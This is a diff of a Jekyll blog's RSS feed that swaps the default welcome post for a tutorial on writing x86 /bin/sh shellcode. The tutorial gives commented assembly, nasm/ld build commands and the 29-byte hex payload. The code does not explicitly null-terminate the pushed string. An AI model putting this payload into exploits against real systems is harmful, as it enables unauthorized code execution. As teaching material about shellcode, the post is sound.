@@ -3,38 +3,49 @@
   <channel>
     <title></title>
     <description></description>
-    <link>/</link>
-    <atom:link href="/feed.xml" rel="self" type="application/rss+xml"/>
-    <pubDate>Sun, 17 Sep 2017 01:43:52 -0300</pubDate>
-    <lastBuildDate>Sun, 17 Sep 2017 01:43:52 -0300</lastBuildDate>
+    <link>http://localhost:4000/</link>
+    <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml"/>
+    <pubDate>Sun, 17 Sep 2017 02:12:54 -0300</pubDate>
+    <lastBuildDate>Sun, 17 Sep 2017 02:12:54 -0300</lastBuildDate>
     <generator>Jekyll v3.5.2</generator>
     
       <item>
-        <title>Welcome to Jekyll!</title>
-        <description>&lt;p&gt;You’ll find this post in your &lt;code class=&quot;highlighter-rouge&quot;&gt;_posts&lt;/code&gt; directory - edit this post and re-build (or run with the &lt;code class=&quot;highlighter-rouge&quot;&gt;-w&lt;/code&gt; switch) to see your changes!
-To add new posts, simply add a file in the &lt;code class=&quot;highlighter-rouge&quot;&gt;_posts&lt;/code&gt; directory that follows the convention: YYYY-MM-DD-name-of-post.ext.&lt;/p&gt;
+        <title>Creating a simple /bin/sh shellcode</title>
+        <description>&lt;p&gt;It’s a simple x86 shellcode to call /bin/sh, the initial code to undestand the sys_execve above have all the comments,&lt;/p&gt;
 
-&lt;p&gt;Jekyll also offers powerful support for code snippets:&lt;/p&gt;
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-assembly&quot; data-lang=&quot;assembly&quot;&gt;;section .data:
+;	cmd: db &quot;/bin/sh&quot;,0x0
 
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ruby&quot; data-lang=&quot;ruby&quot;&gt;&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;print_hi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-  &lt;span class=&quot;nb&quot;&gt;puts&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Hi, &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;#{&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;print_hi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'Tom'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;c1&quot;&gt;#=&amp;gt; prints 'Hi, Tom' to STDOUT.&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+section .text:
+	global _start
+	_start:
+		push ebp		;prologo
+		mov ebp,esp		;prologo
+		sub esp,10		;reserve 10bytes on stack
+		push 0x68732f6e		;send hs/n to stack
+		push 0x69622f2f		;send ib// to stack
+		xor eax,eax		;zero to eax
+		add eax,0x0b		;add 0x0b on eax to call sys_execve(you can consult it on https://syscalls.kernelgrok.com/)
+		mov ebx,esp		;mov //bin/sh(hs/nib//) to ebx
+		xor edx,edx		;zero to edx first arg
+		xor ecx,edx		;zero ecx second arg
+		int 0x80		;kernel interrupt&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
 
-&lt;p&gt;Check out the &lt;a href=&quot;http://jekyllrb.com&quot;&gt;Jekyll docs&lt;/a&gt; for more info on how to get the most out of Jekyll. File all bugs/feature requests at &lt;a href=&quot;https://github.com/mojombo/jekyll&quot;&gt;Jekyll’s GitHub repo&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;compiler &amp;amp;&amp;amp; linker&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;nasm -f elf32 sh3llc0d3.asm &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; ld -o shell sh3llc0d3.o&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;29 bytes shellcode&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;55&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;89&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;E5&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;83&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;EC&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;0A&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;68&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;6E&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;2F&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;73&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;68&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;68&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;2F&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;2F&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;62&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;69&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;31&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;C0&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;83&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;C0&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;0B&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;89&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;E3&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;31&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;D2&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;31&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;D1&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;CD&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;80&quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
 
 </description>
-        <pubDate>Sun, 10 Nov 2013 08:18:00 -0200</pubDate>
-        <link>/thriller/comedy/horror/2013/11/10/welcome-to-jekyll.html</link>
-        <guid isPermaLink="true">/thriller/comedy/horror/2013/11/10/welcome-to-jekyll.html</guid>
+        <pubDate>Sat, 16 Sep 2017 22:51:00 -0300</pubDate>
+        <link>http://localhost:4000/reversing/2017/09/16/Creating-a-simple-shellcode.html</link>
+        <guid isPermaLink="true">http://localhost:4000/reversing/2017/09/16/Creating-a-simple-shellcode.html</guid>
         
         
-        <category>Thriller</category>
-        
-        <category>Comedy</category>
-        
-        <category>Horror</category>
+        <category>Reversing</category>
         
       </item>
     
